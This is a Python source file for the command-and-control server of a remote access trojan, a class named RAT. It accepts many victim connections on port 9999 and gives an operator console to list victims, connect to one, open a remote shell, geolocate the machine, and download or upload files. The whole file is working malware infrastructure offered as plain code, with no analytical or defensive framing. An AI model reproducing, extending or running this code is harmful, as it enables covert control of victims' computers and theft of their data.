import time
import socket
import threading
from queue import Queue

from server.plugins import get_geolocation, shell
from server.banner import print_banner, ABOUT_BANNER


class RAT:
    host: str
    port: int
    nuber_of_thread: int
    job_number: list
    queue: Queue
    all_connections: []
    all_address: []
    s: socket.socket

    def __init__(self, host: str = '', port: int = 9999):
        self.host = host
        self.port = port
        self.nuber_of_thread = 2
        self.job_number = [1, 2]
        self.all_connections = []
        self.all_address = []
        self.queue = Queue()

    def run(self) -> None:
        self.__create_workers()
        self.__create_jobs()

    def __create_jobs(self) -> None:
        for i in self.job_number:
            self.queue.put(i)

        self.queue.join()

    def __create_workers(self) -> None:
        for _ in range(self.nuber_of_thread):
            t = threading.Thread(target=self.__work)
            t.daemon = True
            t.start()

    def __work(self) -> None:
        while True:
            x = self.queue.get()

            if x == 1:
                self.__create_socket()
                self.__accept_connection()
            if x == 2:
                self.__start_handler()

            self.queue.task_done()

    def __start_handler(self) -> None:

        print(ABOUT_BANNER)

        while True:
            cmd = input('rat> ')
            if cmd == 'help' or cmd == 'h':
                print_banner(0)

            elif cmd == 'list' or cmd == 'ls':
                self.__get_connections()

            elif 'connect' in cmd:
                conn = self.__get_target(cmd)

                if conn is not None:
                    self.__send_command(conn)

            else:
                print("Wrong command. write 'help' or 'h' ")

    @staticmethod
    def __send_command(conn: socket.socket) -> None:

        while True:
            try:
                cmd = input('> ')
                if cmd == 'exit':
                    break

                elif cmd == 'help' or cmd == 'h':
                    print_banner(1)

                elif cmd == 'geolocate':
                    get_geolocation(cmd='geolocate', conn=conn)

                elif cmd == 'shell':
                    shell(cmd='shell', conn=conn)

                elif cmd[:8] == 'download':
                    try:
                        file_name = input('input local filename to save ')
                        with open(file_name, "w") as file:
                            conn.send(cmd.encode())
                            data = conn.recv(2147483647).decode()
                            file.write(data)

                            print('successful download')

                    except Exception as err:
                        print("Error ", err)

                elif cmd == 'upload':
                    conn.send(cmd.encode())
                    file = str(input("Enter the filepath to the file: "))
                    filename = str(input("Enter the filepath to outcoming file (with filename and extension): "))
                    data = open(file, 'rb')
                    filedata = data.read(2147483647)
                    conn.send(filename.encode())
                    print("File has been sent")
                    conn.send(filedata)

                else:
                    print('wrong command ')

            except Exception as err:
                print('Error sending commands', err)
                break
        conn.close()

    def __get_target(self, cmd: str) -> socket.socket | None:

        try:
            target = cmd.replace('connect ', '')
            target = int(target)
            conn = self.all_connections[target]

            print('You are new connected to: ' + str(self.all_address[target][0]))
            return conn

        except Exception:
            print('incorrect choice')
            return None

    def __get_connections(self) -> None:

        connections = ''
        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except Exception:
                self.all_connections.pop(i)
                self.all_address.pop(i)
                continue
            connections += str(i) + " " + str(self.all_address[i][0] + "\n")

        print("List of connected clients" + "\n" + connections)

    def __create_socket(self) -> None:
        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.bind((self.host, self.port))
            self.s.listen(5)
        except socket.error as err:
            print("socket binding error" + str(err) + "\n" + "Retrying...")
            time.sleep(10)
            self.__create_socket()

    def __accept_connection(self) -> None:
        if len(self.all_connections) > 0:
            for connection in self.all_connections:
                connection.close()

        self.all_connections.clear()
        self.all_address.clear()

        while True:
            try:
                conn, address = self.s.accept()
                self.s.setblocking(True)
                self.all_connections.append(conn)
                self.all_address.append(address)

            except Exception as err:
                print("Error accepting connection", err)
